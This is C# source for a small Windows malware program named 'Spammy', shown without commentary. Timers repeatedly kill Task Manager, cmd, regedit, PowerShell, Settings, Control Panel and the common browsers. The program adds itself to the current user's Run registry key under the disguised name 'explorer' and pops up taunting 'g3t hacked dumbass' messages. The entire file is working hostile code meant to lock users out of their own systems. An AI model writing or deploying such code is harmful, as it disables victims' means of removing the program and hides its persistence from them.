using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;


namespace Spammy
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            Process[] p = Process.GetProcessesByName("taskmgr");
            if (p.Length > 0)
            {
                p[0].Kill();
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            MessageBox.Show("g3t hacked dumbass", "lol", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            Process[] z = Process.GetProcessesByName("cmd");
                if (z.Length > 0)
            {
                z[0].Kill();
            }
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
           RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
           reg.SetValue("explorer", Application.ExecutablePath.ToString());
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            Process[] k = Process.GetProcessesByName("regedit");
            if (k.Length > 0)
            {
                k[0].Kill();
            }
        }

        private void timer6_Tick(object sender, EventArgs e)
        {
            Process[] o = Process.GetProcessesByName("firefox");
            if (o.Length > 0)
            {
                o[0].Kill();
            }
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            Process[] c = Process.GetProcessesByName("chrome");
            if (c.Length > 0)
            {
                c[0].Kill();
            }

        }

        private void timer8_Tick(object sender, EventArgs e)
        {
            Process[] v = Process.GetProcessesByName("MicrosoftEdge");
            if (v.Length > 0)
            {
                v[0].Kill();
            }
        }

        private void timer9_Tick(object sender, EventArgs e)
        {
            Process[] t = Process.GetProcessesByName("msedge");
            if (t.Length > 0)
            {
                t[0].Kill();
            }
        }

        private void timer10_Tick(object sender, EventArgs e)
        {
            Process[] q = Process.GetProcessesByName("iexplore");
            if (q.Length > 0)
            {
                q[0].Kill();
            }
        }

        private void timer11_Tick(object sender, EventArgs e)
        {
            Process[] n = Process.GetProcessesByName("powershell");
            if (n.Length > 0)
            {
                n[0].Kill();
            }
        }

        private void timer12_Tick(object sender, EventArgs e)
        {
            Process[] t = Process.GetProcessesByName("SystemSettings");
            if (t.Length > 0)
            {
                t[0].Kill();
            }
        }

        private void timer13_Tick(object sender, EventArgs e)
        {
            Process[] j = Process.GetProcessesByName("control");
            if (j.Length > 0)
            {
                j[0].Kill();
            }
        }

    }
}
